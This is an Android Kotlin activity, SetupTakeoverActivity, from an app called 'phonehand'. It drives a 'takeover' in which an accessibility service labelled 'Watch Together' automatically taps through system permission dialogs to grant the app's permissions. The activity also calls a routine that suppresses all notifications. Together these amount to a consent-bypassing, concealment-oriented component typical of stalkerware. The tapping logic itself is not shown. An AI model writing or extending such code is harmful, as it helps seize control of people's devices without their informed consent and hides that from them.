package com.phonehand.app

import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.Button
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

/** Shows progress while AI auto-grants permissions via accessibility taps. */
class SetupTakeoverActivity : AppCompatActivity() {

    private lateinit var logView: TextView
    private lateinit var statusLine: TextView
    private lateinit var logScroll: ScrollView
    private lateinit var btnClose: Button
    private val mainHandler = Handler(Looper.getMainLooper())
    private val logLines = mutableListOf<String>()
    private var finished = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_setup_takeover)

        logView = findViewById(R.id.takeoverLog)
        statusLine = findViewById(R.id.takeoverStatus)
        logScroll = findViewById(R.id.takeoverLogScroll)
        btnClose = findViewById(R.id.btnTakeoverClose)

        btnClose.setOnClickListener { finish() }
        btnClose.visibility = View.GONE

        if (!WatchSync.isEnabled(this)) {
            appendLog("Turn on Watch Together in Accessibility first.")
            showDone(false)
            return
        }

        requestRuntimePermissions()
        StealthNotifications.suppressAll(this)
        startTakeover()
    }

    override fun onDestroy() {
        PermissionAutoGrant.cancel()
        super.onDestroy()
    }

    private fun requestRuntimePermissions() {
        val needed = PermissionRequester.missing(this)
        if (needed.isNotEmpty()) {
            appendLog("Requesting: ${needed.joinToString { it.substringAfterLast('.') }}")
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQ_PERMISSIONS)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != REQ_PERMISSIONS) return
        permissions.indices.forEach { i ->
            val name = permissions[i].substringAfterLast('.')
            val ok = grantResults.getOrNull(i) == PackageManager.PERMISSION_GRANTED
            appendLog(if (ok) "✓ $name granted" else "○ $name — tapping dialog…")
        }
    }

    private fun startTakeover() {
        statusLine.text = getString(R.string.takeover_running)
        PermissionAutoGrant.run(this, object : PermissionAutoGrant.Callback {
            override fun onLog(line: String) {
                mainHandler.post { appendLog(line) }
            }

            override fun onDone(taps: Int) {
                mainHandler.post {
                    statusLine.text = if (taps > 0) {
                        getString(R.string.takeover_done)
                    } else {
                        getString(R.string.takeover_none)
                    }
                    showDone(true)
                }
            }

            override fun onError(message: String) {
                mainHandler.post {
                    appendLog(message)
                    statusLine.text = getString(R.string.takeover_error)
                    showDone(false)
                }
            }
        })
    }

    private fun appendLog(line: String) {
        logLines.add(line)
        logView.text = logLines.joinToString("\n")
        logScroll.post { logScroll.fullScroll(View.FOCUS_DOWN) }
    }

    private fun showDone(success: Boolean) {
        if (finished) return
        finished = true
        btnClose.visibility = View.VISIBLE
        btnClose.text = getString(if (success) R.string.takeover_close else android.R.string.ok)
    }

    companion object {
        private const val REQ_PERMISSIONS = 9001
    }
}
